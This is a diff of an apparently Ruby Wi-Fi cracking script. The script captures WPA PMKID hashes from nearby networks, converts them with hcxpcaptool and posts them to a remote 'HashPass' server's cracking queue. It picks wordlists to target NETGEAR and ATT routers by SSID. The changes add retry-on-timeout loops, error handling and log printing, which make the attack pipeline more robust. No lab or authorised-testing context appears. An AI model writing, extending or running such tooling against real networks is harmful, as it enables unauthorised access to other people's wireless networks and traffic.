@@ -38,6 +38,10 @@ puts "Logging in as #{ creds[:handle] }..."
 begin
   token = JSON.parse(RestClient.post(server + '/hplogin', creds.to_json, { content_type: :json, accept: :json }))['token']
   auth = { :Authorization => "Bearer #{token}" }
+rescue Errno::ECONNREFUSED, Net::ReadTimeout => e
+  puts "Timeout (#{e}), retrying in 5 seconds..."
+  sleep 5
+  retry
 rescue RestClient::ExceptionWithResponse => e  
   puts 'Error Logging in.'.red
   p e.response
@@ -119,14 +123,28 @@ if wlan && token
             dictionary2: '',
             hashid: hash_res.body.to_i
           }.merge!(new_hash)
+
           # Detect SSID type and adjust params for a targeted attack
           queue_item[:dictionary] = '/media/root/6TB/wordlists/WoNDeR.txt' if ssid =~ /NETGEAR/
           # queue_item[:dictionary] = '/media/root/6TB/wordlists/nvg599.txt' if ssid =~ /ATT/
+          
           if hash_res.code == 201
             puts "#{ queue_item[:name] } already exists in HashPass database.".yellow
           else
             puts "Sending for CRACKING! #{queue_item[:name]} 🚀".light_green
-            res = RestClient.post(server + '/api/pending', queue_item.to_json, auth)          
+            begin
+              res = RestClient.post(server + '/api/pending', queue_item.to_json, auth)
+            rescue Errno::ECONNREFUSED, Net::ReadTimeout => e
+              puts "Timeout (#{e}), retrying in 5 seconds..."
+              sleep 5
+              retry
+            rescue RestClient::ExceptionWithResponse => e  
+              puts "Error Logging in: #{ e.response }".red
+            rescue RestClient::Unauthorized, RestClient::Forbidden => e
+              puts "Access denied: #{ e.response }".red
+            rescue => e
+              puts "Error logging in: #{ e.response }".red
+             end
           end
         end
       end
@@ -140,11 +158,13 @@ end
 
 # Look for PMKIDs
 loop do
-  print '.'
   $stdout.flush
   tail = `tail -n 7 logs/#{ timestamp }.log`
-  line = tail.split("\n")
-  found = line.grep(/FOUND PMKID/)[0]
+  if tail
+    line = tail.split("\n")
+    print 'hcxpcaptool: '.red + line[0].split("[").last.delete("]") + "\n"
+    found = line.grep(/FOUND PMKID/)[0]
+  end
   if found
     `rm pmkid/#{ timestamp }.16800` unless seen.empty?
     `hcxpcaptool -z pmkid/#{ timestamp }.16800 pcapng/#{ timestamp }.pcapng`
